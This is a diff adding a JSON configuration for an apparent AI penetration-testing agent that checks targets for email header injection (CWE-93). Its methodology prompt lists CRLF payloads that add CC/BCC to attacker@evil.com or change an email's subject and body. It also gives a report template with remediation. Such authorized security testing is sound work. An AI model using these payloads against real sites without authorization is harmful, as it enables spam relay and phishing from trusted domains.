@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/email_injection",
+  "version": "1.0.0",
+  "title": "Email Injection Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-93"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "read_only",
+  "methodology": "# Email Injection Specialist Agent\n## User Prompt\nYou are testing **{target}** for Email Header Injection.\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Identify Email Functions\n- Contact forms, feedback forms\n- Invite/share features, newsletter subscription\n- Password reset, email verification\n### 2. Injection Payloads\n- Add CC: `victim@test.com%0aCc:attacker@evil.com`\n- Add BCC: `victim@test.com%0aBcc:attacker@evil.com`\n- Change subject: `victim@test.com%0aSubject:Phishing`\n- Change body: `victim@test.com%0a%0aMalicious body content`\n### 3. Verify\n- Check if additional recipients receive email\n- Check if email headers are modified\n### 4. Report\n```\nFINDING:\n- Title: Email Injection at [endpoint]\n- Severity: Medium\n- CWE: CWE-93\n- Endpoint: [URL]\n- Parameter: [field]\n- Payload: [injection]\n- Effect: [CC/BCC added, subject changed]\n- Impact: Spam relay, phishing from trusted domain\n- Remediation: Validate email strictly, strip CRLF from email inputs\n```\n## System Prompt\nYou are an Email Injection specialist. Email injection is confirmed when CRLF in email-related fields adds headers (CC, BCC, Subject) or modifies email content. Since you may not receive the email, look for: different server response, timing differences, or error messages suggesting header parsing.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/email_injection.md",
+  "warnings": []
+}
